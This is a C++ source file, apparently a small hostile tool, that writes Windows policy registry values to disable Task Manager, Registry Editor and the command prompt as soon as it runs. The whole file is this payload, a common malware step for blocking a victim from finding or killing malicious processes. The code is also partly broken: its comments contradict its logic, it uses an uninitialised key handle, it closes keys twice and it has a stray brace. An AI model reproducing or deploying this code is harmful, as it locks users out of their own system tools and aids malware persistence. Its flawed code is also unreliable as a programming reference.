/*
	author: RockaDev
	github: www.github.com/rockadev
*/
#include "header.h"
#include "cmd.h"

void CMD::WinRegistry::ProcessValueCMD()
{
	{
		_L32 cmdResult = RegQueryValueExW(hKey, DisableCommandPrompt, NULL, NULL, NULL, NULL);

		if (cmdResult == ERROR_FILE_NOT_FOUND) // Check if file already exists
		{
			// If so, then change the DWORD value to number=1
			if (RegSetValueExW(hKey, DisableCommandPrompt, 0, REG_DWORD, (const BYTE*)&val_disable, sizeof(val_disable)) != ERROR_SUCCESS)
			{
				return; // If error occurs
			}
			else
			{
				RegCloseKey(hKey); // If success, then close the key
			}
		}
		else
		{
			// Try to change the value anyway
			RegSetValueExW(hKey, DisableCommandPrompt, 0, REG_DWORD, (const BYTE*)&val_disable, sizeof(val_disable));
			RegCloseKey(hKey);
			return;
		}
		RegCloseKey(hKey);
	}

};

void CMD::WinRegistry::_disableCMD()
{
	{
		// Check if System key already exists
		RegOpenKeyExW(hKey, CMD_PATH, 0, KEY_ALL_ACCESS, &hKey);
		if (RegCreateKeyExW(hKey, L"System", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL) != ERROR_SUCCESS)
		{
			// If not, create a new key
			CMD_PATH = (L"SOFTWARE\\Policies\\Microsoft\\Windows\\System\\");
			ProcessValueCMD(); // Run the function above
		}
		else
		{
			// If exists, proceed to a next function
			ProcessValueCMD();
		}
		return;
	}
};

void SYS::Registry::ProcessValue()
{
	_L32 mgrResult = RegQueryValueExW(hKey, DisableTaskMgr, NULL, NULL, NULL, NULL);
	_L32 regResult = RegQueryValueExW(hKey, DisableReg, NULL, NULL, NULL, NULL);
	// Check if these values exists

	if (mgrResult == ERROR_FILE_NOT_FOUND && regResult == ERROR_FILE_NOT_FOUND)
	{
		// Try to create new values
		if (RegSetValueExW(hKey, DisableTaskMgr, 0, REG_DWORD, (const BYTE*)&val_disable, sizeof(val_disable)) != ERROR_SUCCESS)
		{
			return;
		}
		else if (RegSetValueExW(hKey, DisableReg, 0, REG_DWORD, (const BYTE*)&val_disable, sizeof(val_disable)) != ERROR_SUCCESS)
		{
			return;
		}
		else
		{
			RegCloseKey(hKey);
		}
	}
	else
	{
		// If those values exist, change them to number=1
		RegSetValueExW(hKey, DisableTaskMgr, 0, REG_DWORD, (const BYTE*)&val_disable, sizeof(val_disable));
		RegSetValueExW(hKey, DisableReg, 0, REG_DWORD, (const BYTE*)&val_disable, sizeof(val_disable));
		RegCloseKey(hKey);
	}
	RegCloseKey(hKey);
}
void SYS::Registry::ModifyRegistry()
{
	RegOpenKeyExW(hKey, TMGR_PATH, 0, KEY_ALL_ACCESS, &hKey);

	// Check if the key already exists, if not, create a new one and proceed to a next function

	if (RegCreateKeyExW(hKey, L"System", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL) != ERROR_SUCCESS)
	{
		TMGR_PATH = (L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\");
		ProcessValue();
	}
	else
	{
		ProcessValue();
	}
	return;
}

};

int main(int args, char * argv[])
{
	SYS::Registry reg; // Declare class as reg
	CMD::WinRegistry winreg; // Declare class as winreg

	reg.ModifyRegistry(); // Run T_MGR,REG function from class
	winreg._disableCMD(); // Run CMD function from class

	return 0;
}
